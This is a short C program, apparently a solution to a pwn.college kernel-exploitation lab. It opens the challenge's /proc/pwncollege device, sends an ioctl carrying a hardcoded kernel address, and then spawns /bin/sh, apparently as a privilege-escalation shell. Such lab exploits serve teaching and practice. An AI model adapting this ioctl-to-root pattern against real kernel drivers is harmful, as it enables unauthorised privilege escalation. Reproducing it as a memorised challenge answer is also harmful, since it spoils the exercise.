#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  ioctl(fd, 0x539, 0xffffffffc000093d);
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
